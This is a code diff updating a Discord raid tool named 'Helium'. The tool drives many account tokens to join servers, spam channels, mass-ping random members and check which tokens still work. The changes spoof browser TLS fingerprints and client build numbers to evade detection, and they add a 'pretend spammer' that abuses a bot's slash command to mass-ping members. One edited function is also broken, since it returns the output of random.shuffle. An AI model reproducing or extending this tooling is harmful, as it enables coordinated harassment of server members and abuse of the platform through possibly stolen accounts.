@@ -1,5 +1,10 @@
 import os
 
+if os.name == "nt":
+    pass
+else:
+    os._exit(0)
+
 try:
     from colorama import Fore
     from colorist import ColorHex as h
@@ -48,7 +53,7 @@ def Clear():
 Clear()
 os.system('title Helium')
 
-session = tls_client.Session("okhttp4_android_13",random_tls_extension_order=True)
+session = tls_client.Session(client_identifier="chrome_119",random_tls_extension_order=True)
 
 def get_random_str(length: int) -> str:
     return "".join(
@@ -84,7 +89,7 @@ class Files:
             if not os.path.exists("config.json"):
                 data = {
                     "proxies": False,
-                    "color" : "blue"
+                    "color" : "light_blue"
                 }
                 with open("config.json", "w") as f:
                     json.dump(data, f, indent=4)
@@ -148,12 +153,9 @@ class Render:
 
     def render_ascii(self):
         Clear()
-        with open("data/tokens.txt", "r") as f:
-            tokens = f.read().splitlines()
         with open("data/proxies.txt") as f:
             proxies = f.read().splitlines()
         os.system(f"title Helium - Connected as {os.getlogin()}")
-        Clear()
         edges = ["╗", "║", "╚", "╝", "═", "╔"]
         title = f"""
 {'██╗  ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗'.center(self.size)}
@@ -168,13 +170,15 @@ class Render:
         print(title)
 
     def raider_options(self):
+        with open("data/tokens.txt", "r") as f:
+            tokens = f.read().splitlines()
         edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
         title = f"""{' '*44}{Fore.RESET} Loaded ‹{Fore.LIGHTCYAN_EX}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{Fore.LIGHTCYAN_EX}{len(proxies)}{Fore.RESET}> proxies
 
 {'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
 {'│ «01» Joiner            «07» Token Formatter    «13» Voice Joiner      «19» Call Spammer     │'.center(self.size)}
-{'│ «02» Leaver            «08» Button Click       «14» Change Nickname   «20» DCounter Spam    │'.center(self.size)}
-{'│ «03» Spammer           «09» Accept Rules       «15» Thread Spammer    «21» Inviter          |'.center(self.size)}
+{'│ «02» Leaver            «08» Button Click       «14» Change Nickname   «20» Inviter          │'.center(self.size)}
+{'│ «03» Spammer           «09» Accept Rules       «15» Thread Spammer    «21» ???              |'.center(self.size)}
 {'│ «04» Token Checker     «10» Guild Check        «16» Friender          «22» ???              │'.center(self.size)}
 {'│ «05» Reactor           «11» Bio Changer        «17» Typer             «23» ???              │'.center(self.size)}
 {'│ «06» Voice Raper       «12» Onliner            «18» Onboarding Bypass «24» Exit             │'.center(self.size)}
@@ -446,15 +450,15 @@ class Raider:
                 "os": "Windows",
                 "browser": "Discord Client",
                 "release_channel": "stable",
-                "client_version": "1.0.9023",
+                "client_version": "1.0.9024",
                 "os_version": "10.0.19045",
                 "os_arch":"x64",
                 "app_arch":"ia32",
                 "system_locale": "en",
-                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9024 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
                 "browser_version": "22.3.26",
-                "client_build_number": 244358,
-                "native_build_number": 39334,
+                "client_build_number": 247929,
+                "native_build_number": 40010,
                 "client_event_source": None,
                 "design_id": 0,
             }
@@ -471,7 +475,7 @@ class Raider:
             "authorization": token,
             "cookie": self.cookies,
             "content-type": "application/json",
-            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9024 Chrome/108.0.5359.215 Electron/22.3.26 Safari/537.36",
             "x-discord-locale": "en-US",
             'x-debug-options': 'bugReporterEnabled',
             "x-super-properties": self.props,
@@ -545,10 +549,7 @@ class Raider:
 
     def emojis():
         emos = list("😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑😬🙄😯😦😧😮😲🥱😴🤤😪😵😵‍💫🤐🥴🤢🤮🤧😷🤒🤕🤑🤠😈👿👹👺🤡💩👻💀☠️👽👾🤖🎃😺😸😹😻😼😽🙀😿😾😀😃😄😁😆😅😂🤣😊😇🙂🙃😉😌😍🥰😘😗😙😚😋😛😝😜🤪🤨🧐🤓😎🤩🥳😏😒😞😔😟😕🙁☹️😣😖😫😩🥺😢😭😮‍💨😤😠😡🤬🤯😳🥵🥶😱😨😰😥😓🤗🤔🤭🤫🤥😶😶‍🌫️😐😑")
-        random.shuffle(emos)
-        emojis=""
-        for emoji in emos:
-            emojis+=emoji
+        emojis = random.shuffle(emos)
         return emojis
 
     def avatar_changer(self, token):
@@ -759,21 +760,19 @@ class Raider:
         except Exception as e:
             console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
-    def masspanel(self, token, guild, channel):
+    def pretend_spammer(self, token, guild, channel, message, count):
         try:
             while True:
                 headers = self.headers(token)
-
                 headers[
                     "content-type"
-                ] = "multipart/form-data; boundary=----WebKitFormBoundary1hIjYVJbLUqgQTKR"
-
+                ] = "multipart/form-data; boundary=----WebKitFormBoundaryT2gaxV1TBgqdCl5l"
+                
+                pings = self.get_random_members(guild, int(count))
                 data = (
-                    '------WebKitFormBoundary1hIjYVJbLUqgQTKR\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n{"type":2,"application_id":"703886990948565003","guild_id":"%s","channel_id":"%s","session_id":"%s","data":{"version":"1014638915954675737","id":"1014638915954675733","name":"panel","type":1,"options":[],"application_command":{"id":"1014638915954675733","application_id":"703886990948565003","version":"1014638915954675737","default_member_permissions":null,"type":1,"nsfw":false,"name":"panel","description":"Send a verification panel/button in that channel","dm_permission":true,"contexts":null,"integration_types":[0]},"attachments":[]},"nonce":"1158803562642276352"}\r\n------WebKitFormBoundary1hIjYVJbLUqgQTKR--\r\n'
-                    % (guild, channel, uuid.uuid4().hex)
+                    '------WebKitFormBoundaryT2gaxV1TBgqdCl5l\r\nContent-Disposition: form-data; name="payload_json"\r\n\r\n{"type":2,"application_id":"1006133881403084860","guild_id":"%s","channel_id":"%s","session_id":"%s","data":{"version":"1173568212244385863","id":"1118824035086770243","name":"8ball","type":1,"options":[{"type":3,"name":"question","value":"%s"}],"application_command":{"id":"1118824035086770243","type":1,"application_id":"1006133881403084860","version":"1173568212244385863","name":"8ball","description":"Ask the 8ball a question","options":[{"type":3,"name":"question","description":"…","required":true,"description_localized":"…","name_localized":"question"}],"integration_types":[0],"description_localized":"Ask the 8ball a question","name_localized":"8ball"},"attachments":[]},"nonce":"1176874121972154368","analytics_location":"slash_ui"}\r\n------WebKitFormBoundaryT2gaxV1TBgqdCl5l--\r\n'
+                    % (guild, channel, uuid.uuid4().hex, f"{message} {pings}")
                 )
-
-                time.sleep(3)
 
                 response = session.post(
                     "https://canary.discord.com/api/v9/interactions",
@@ -790,8 +789,10 @@ class Raider:
                         time.sleep(float(retry_after))
                     case _:
                         console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
+                        return
+                time.sleep(5)
         except Exception as e:
-            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
+            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
     def join_voice_channel(self, guild_id, channel_id):
         ws = websocket.WebSocket()
@@ -868,39 +869,35 @@ class Raider:
 
     def token_checker(self):
         valid = []
+        
+        with open("data/tokens.txt", "r") as f:
+            tokens = f.read().splitlines()
 
         def main(token):
-            while True:
-                try:
+            try:
+                while True:
                     response = session.get(
-                        "https://canary.discord.com/api/v9/users/@me/billing/payment-sources",
+                        "https://canary.discordapp.com/api/v9/users/@me/library",
                         headers=self.headers(token),
                     )
+
                     match response.status_code:
                         case 200:
-                            console.log("VALID", C["green"], token[:25])
+                            console.log("Valid", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                             valid.append(token)
-                            break
-                        case 403:
-                            console.log("LOCKED", C["yellow"], token[:25])
                             break
                         case 429:
                             retry_after = response.json().get('retry_after')
                             console.log("RATELIMITED", C["pink"], token[:25], f"{retry_after}s")
                             time.sleep(retry_after)
-                        case _:
-                            console.log(
-                                "INVALID",
-                                C["red"],
-                                token[:25],
-                                response.json().get("message"),
-                            )
                             break
-                    with open("data/tokens.txt", "w") as f:
-                        f.write("\n".join(valid))
-                except Exception as e:
-                    console.log("FAILED", C["red"], token[:25], e)
-                    break
+                        case _:
+                            console.log("Invalid", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
+                            break
+                with open("data/tokens.txt", "w") as f:
+                    f.write("\n".join(valid))
+            except Exception as e:
+                console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)
 
         args = [
             (token, ) for token in tokens
@@ -1499,8 +1496,7 @@ class Menu:
             "17": self.typierq,
             "18": self.onboard,
             "19": self.caller,
-            "20": self.double,
-            "21": self.inviter,
+            "20": self.inviter,
             "24": self.exit,
         }
 
@@ -1508,8 +1504,7 @@ class Menu:
         if _input:
             input()
         console.run()
-        choice = input(f"{' '*4}{Fore.LIGHTCYAN_EX}> ")
-        
+        choice = input(f"{' '*4}{Fore.LIGHTCYAN_EX}> {Fore.RESET}")
         if choice in self.options:
             console.render_ascii()
             self.options[choice]()
@@ -1571,27 +1566,6 @@ class Menu:
             (token, channel) for token in tokens
         ]
         self.run(self.raider.inviter, args)
-
-    @wrapper
-    def double(self):
-        with open("data/tokens.txt", "r") as f:
-            tokens = f.read().splitlines()
-        os.system('title Helium - masspanel')
-        Link = input(console.prompt("Channel LINK"))
-        if Link == "":
-            Menu().main_menu()
-        if Link.startswith("https://"):
-            pass
-        else:
-            Menu().main_menu()
-        Clear()
-        console.render_ascii()
-        guild = Link.split("/")[4]
-        channel = Link.split("/")[5]
-        args = [
-            (token, guild, channel) for token in tokens
-        ]
-        self.run(self.raider.masspanel, args)
 
     @wrapper
     def caller(self):
@@ -1795,8 +1769,13 @@ class Menu:
                     args = [(token, guild_id, channel_id, message, count) for token in tokens]
                     self.run(self.raider.dyno_massping, args)
                 else:
-                    args = [(token, channel_id, message, guild_id, True, count, False) for token in tokens]
-                    self.run(self.raider.spammer, args)
+                    pretend = input(console.prompt("Pretend Spammer", True))
+                    if "y" in pretend:
+                        args = [(token, guild_id, channel_id, message, count) for token in tokens]
+                        self.run(self.raider.pretend_spammer, args)
+                    else:
+                        args = [(token, channel_id, message, guild_id, True, count, False) for token in tokens]
+                        self.run(self.raider.spammer, args)
             else:
                 args = [(token, channel_id, message) for token in tokens]
                 self.run(self.raider.spammer, args)
